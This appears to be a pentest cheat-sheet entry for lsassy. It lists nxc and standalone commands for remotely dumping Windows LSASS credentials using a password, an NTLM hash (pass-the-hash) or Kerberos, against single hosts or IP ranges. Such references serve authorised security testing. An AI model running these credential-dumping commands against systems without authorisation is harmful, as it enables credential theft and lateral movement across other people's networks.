# Lsassy

## Lsassy basic usage with nxc auth pass
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
nxc smb <ip> -d <domain> -u '<user>' -p '<password>' -M lsassy
```
## Lsassy basic usage with nxc auth hash
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
nxc smb <ip> -d <domain> -u '<user>' -H '<hash>' -M lsassy
```

## Lsassy basic usage with password (ip or range)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
lsassy -d <domain> -u <user> -p <password> <ip>
```

## Lsassy basic usage with hash (ip or range)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
lsassy -v -u <user> -H <hash> <ip>
```

## Lsassy basic usage with kerberos (ip or range)
#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
lsassy -d <domain> -u <user> -k <ip_range>
```
